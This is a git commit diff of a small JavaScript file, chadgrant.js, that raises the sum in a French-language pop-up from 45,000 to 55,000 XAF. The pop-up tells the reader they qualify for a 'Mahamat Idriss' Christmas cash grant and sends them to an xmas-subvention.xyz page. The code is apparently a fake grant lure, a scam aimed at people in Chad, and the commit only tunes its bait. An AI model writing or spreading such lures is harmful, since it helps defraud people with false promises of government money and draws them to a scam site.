628c9410771a34c227ac405fe3316829685dd64a
bigetijazz14 <bigetijazz14@gmail.com>
2024-11-29 05:03:48 -0800

    Update chadgrant.js

--- chadgrant.js
+++ chadgrant.js
@@ -1,6 +1,6 @@
 
-var password = 'RECLAMER 45,000 XAF'
-password=prompt('SMS: Félicitations, vous êtes admissible à MAHAMAT IDRISS 45,000 XAF SUBVENTION EN ESPÈCES DE NOËL POUR TOUS, Veuillez appuyer sur OK pour RECLAMER Prix ​​en espèces','RECLAMER 45,000 XAF');
-if (password != 'RECLAMER 45,000 XAF') {
-location.href='https://www.xmas-subvention.xyz/Retirer-45000XAF';
+var password = 'RECLAMER 55,000 XAF'
+password=prompt('SMS: Félicitations, vous êtes admissible à MAHAMAT IDRISS 55,000 XAF SUBVENTION EN ESPÈCES DE NOËL POUR TOUS, Veuillez appuyer sur OK pour RECLAMER Prix ​​en espèces','RECLAMER 55,000 XAF');
+if (password != 'RECLAMER 55,000 XAF') {
+location.href='https://www.xmas-subvention.xyz/Retirer-55000XAF';
 }
